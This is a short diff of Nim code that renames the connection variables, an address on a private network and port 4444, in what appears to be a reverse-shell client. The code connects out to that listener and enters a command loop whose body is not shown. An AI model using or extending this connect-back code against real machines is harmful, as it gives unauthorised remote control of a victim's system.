@@ -7,8 +7,8 @@ var
   socket = newSocket()
 
 var
-  targetIP = "192.168.1.25"
-  targetPort = "4444"
+  myIP = "192.168.1.25"
+  myPort = "4444"
 
 let
   exitMessage = "Exiting.."
@@ -16,7 +16,7 @@ let
   defaultDirectory = "C:\\"
 
 try:
-  socket.connect(targetIP, Port(parseInt(targetPort)))
+  socket.connect(myIP, Port(parseInt(myPort)))
 
   while true:
 
